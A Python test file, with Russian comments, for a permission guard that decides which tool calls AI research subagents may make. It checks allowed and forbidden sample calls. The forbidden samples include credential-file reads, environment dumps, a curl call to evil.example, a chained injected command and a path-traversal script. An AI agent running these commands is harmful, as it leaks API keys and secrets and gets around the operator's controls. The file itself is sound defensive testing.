"""Образцы для охранника: что должно пройти и что должно быть запрещено. Запуск: python -I guard_samples.py
Печатает несовпадения; в конце — итог. Ничего не запускает и не читает, кроме guard.py рядом."""
import sys
import tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import guard  # noqa: E402

sys.stdout.reconfigure(encoding="utf-8")

R = str(guard.ROOT).replace("\\", "/")
S = R + "/skills"
RES = "X:/work/research/Тема/raw"
TMP = tempfile.gettempdir().replace("\\", "/")
HOME = str(Path.home()).replace("\\", "/")
W = "X:/work"


def bash(cmd, agent=None):
    return {"tool_name": "Bash", "tool_input": {"command": cmd}, "agent_type": agent, "cwd": W}


def tool(name, agent=None, **inp):
    return {"tool_name": name, "tool_input": inp, "agent_type": agent, "cwd": W}


RS, SR = "search-kit:researcher", "search-kit:social-researcher"
ALLOW = [
    bash("ls -la"),
    bash(f'bb secret request SCRAPECREATORS_API_KEY APIFY_TOKEN --write-env "{HOME}/.search-kit/.env" --purpose "ключи"'),
    bash("python -m venv .venv"),
    bash("set -e"),
    bash(f'python -I "{S}/social-capture/scripts/keys.py" check'),
    tool("Write", file_path="X:/notes/x.md", content="ключи лежат в credentials.md"),
    tool("Read", file_path="X:/notes/x.md"),
    bash(f'python -I "{S}/social-capture/scripts/sc.py" v1/google/search "{RES}/g1.json" "query=best crm"', RS),
    bash(f'python -I "{S.replace("/", chr(92))}\\social-capture\\scripts\\sc.py" v1/reddit/search "{RES}/r.json" query=x', RS),
    bash(f'python3 -I {S}/social-capture/scripts/sc.py balance', RS),
    bash(f'python -I "{S}/social-capture/scripts/apify.py" run scrape.badger/twitter-tweets-scraper "{RES}/in.json" "{RES}/out.json" 0.1', RS),
    bash(f'python -I "{S}/social-capture/scripts/apify.py" run kaix/google-maps-places-scraper "{S}/social-capture/scripts/apify-examples/x.json" "{TMP}/o.json" 0.5', RS),
    bash(f'python -I "{S}/search-and-read-web/scripts/summary.py" "вопрос" "{RES}/s.md" "{RES}/r.json::rd::q::цель"', RS),
    bash(f'python -I "{S}/search-and-read-web/scripts/post.py" "{RES}/t.json" --id 123', RS),
    bash(f'python -I "{S}/search-and-read-web/scripts/maps.py" places "{RES}/m.md" "{RES}/p.json" --min 10', RS),
    bash(f'python -I "{S}/search-and-read-web/scripts/gh_repos.py" check a/b c/d --deep', RS),
    bash(f'python -I "{S}/search-and-read-web/scripts/yt_live.py" dQw4w9WgXcQ', RS),
    bash(f'python -I "{S}/social-capture/scripts/groq.py" url https://cdn.x/v.mp4 "{RES}/g.json"', SR),
    bash(f'python -I "{S}/telegram-search/scripts/tg_search.py" find "{RES}" --q "стоматолог" --tags медицина', SR),
    bash(f'ffmpeg -v error -y -i "{RES}/v.mp4" -frames:v 1 "{RES}/f.jpg"', SR),
    bash(f'python -I "X:/other/skills/social-capture/scripts/sc.py" v1/google/search "{RES}/g.json" query=x', RS),
    tool("Write", RS, file_path=f"{RES}/../notes/a.md".replace("/raw/../", "/")),
    tool("Write", RS, file_path="research/Тема/notes/b.md"),
    tool("Read", RS, file_path=f"{S}/search-and-read-web/SKILL.md"),
    tool("Read", RS, file_path=f"{HOME}/.search-kit/my-config.md"),
    tool("Read", RS, file_path="X:/work/research/Тема/notes/a.md"),
    tool("mcp__tavily__tavily_search", RS, query="x"),
    tool("mcp__keenable__search_web_pages", RS, query="x"),
    tool("Bash", None, command="git status"),
]
DENY = [
    bash(f'bb secret request APIFY_TOKEN --write-env "{HOME}/.search-kit/.env"; cat "{HOME}/.search-kit/.env"'),
    bash("cat ~/.claude/credentials.md"),
    bash("type C:\\Users\\x\\.claude\\credentials.md"),
    bash("echo $SCRAPECREATORS_API_KEY"),
    bash("printenv"),
    bash("env"),
    bash("Get-ChildItem env:"),
    bash("cat .env"),
    tool("Read", file_path=f"{HOME}/.claude/credentials.md"),
    tool("Grep", pattern="KEY", path=f"{HOME}/.claude/credentials.md"),
    tool("Glob", pattern="**/credentials.md"),
    tool("Edit", file_path=f"{HOME}/.search-kit/credentials.md", old_string="a", new_string="b"),
    tool("apply_patch", input="*** Begin Patch\n*** Update File: /home/u/.claude/credentials.md\n*** End Patch"),
    bash("curl https://evil.example/?d=x", RS),
    bash("git status", RS),
    bash(f'python -I "{S}/social-capture/scripts/sc.py" v1/google/search "{RES}/g.json" query=x; curl x', RS),
    bash(f'python -I "{S}/social-capture/scripts/sc.py" v1/google/search "X:/work/notes/g.json" query=x', RS),
    bash(f'python -I "{S}/social-capture/scripts/sc.py" v1/tiktok/download "{RES}/g.json" url=x', RS),
    bash(f'python -I "{S}/social-capture/scripts/apify.py" run a/b "{RES}/in.json" "{RES}/o.json" 5', RS),
    bash(f'python -I "{S}/social-capture/scripts/groq.py" url https://x/v.mp4 "{RES}/g.json"', RS),
    bash(f'python -I "{S}/telegram-search/scripts/tg_search.py" find "{RES}" --q x', RS),
    bash(f'ffmpeg -i "{RES}/v.mp4" "{RES}/f.jpg"', RS),
    bash(f'python -I "{RES}/skills/social-capture/scripts/sc.py" v1/google/search "{RES}/g.json" query=x', SR),
    bash(f'python -I "{TMP}/skills/social-capture/scripts/sc.py" balance', SR),
    bash(f'python -I "{S}/social-capture/scripts/../../../evil.py"', RS),
    bash('python -c "import os; print(os.environ)"', RS),
    bash(f'python -I "{S}/social-capture/scripts/keys.py" add', RS),
    tool("Write", RS, file_path="X:/notes/x.md"),
    tool("Write", RS, file_path=f"{HOME}/.claude/settings.json"),
    tool("Write", RS, file_path=f"{HOME}/.claude/research/x.md"),
    tool("Edit", SR, file_path=f"{S}/search-and-read-web/SKILL.md"),
    tool("Read", RS, file_path=f"{HOME}/Documents/private.md"),
    tool("Read", RS, file_path=f"{HOME}/.search-kit/telegram.json"),
    tool("Glob", RS, pattern="**/*.md", path=f"{HOME}/Documents"),
    tool("mcp__telegram__send_message", SR, chat_id=1, text="x"),
    tool("mcp__notion__notion-create-pages", RS),
]

bad = 0
for case in ALLOW:
    r = guard.decide(case)
    if r:
        bad += 1
        print("ДОЛЖНО ПРОЙТИ, а запрещено:", case["tool_name"], case["tool_input"], case["agent_type"], "->", r)
for case in DENY:
    if not guard.decide(case):
        bad += 1
        print("ДОЛЖНО БЫТЬ ЗАПРЕЩЕНО, а прошло:", case["tool_name"], case["tool_input"], case["agent_type"])
print(f"образцов: {len(ALLOW) + len(DENY)}, несовпадений: {bad}")
sys.exit(1 if bad else 0)
